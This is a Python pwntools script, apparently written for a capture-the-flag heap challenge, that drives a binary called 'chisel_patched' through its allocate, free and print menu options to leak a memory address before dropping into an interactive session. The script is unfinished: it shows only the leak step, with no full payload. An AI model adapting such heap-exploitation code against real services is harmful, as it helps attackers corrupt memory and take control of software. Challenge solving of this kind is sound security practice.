from pwn import *
from icecream import ic

exe = ELF("./chisel_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def malloc(size):
    sla(b'>',b'1'); sla(b'size: ',str(size).encode())

def free():
    sla(b'>',b'2')

def edit(data):
    sla(b'>',b'3'); sla(b'data: ', data)

def printf():
    sla(b'>',b'4'); ru(b'data: '); data = int(rl().strip())
    print(f"DATA: {data}")
    return data

def chisel():
    sla(b'>',b'5')

def get_out():
    sla(b'>',b'6')

malloc(10000)
chisel()
free()
leak = printf()
info(f"LEAK: {hex(leak)}")
malloc(0x10000)

i()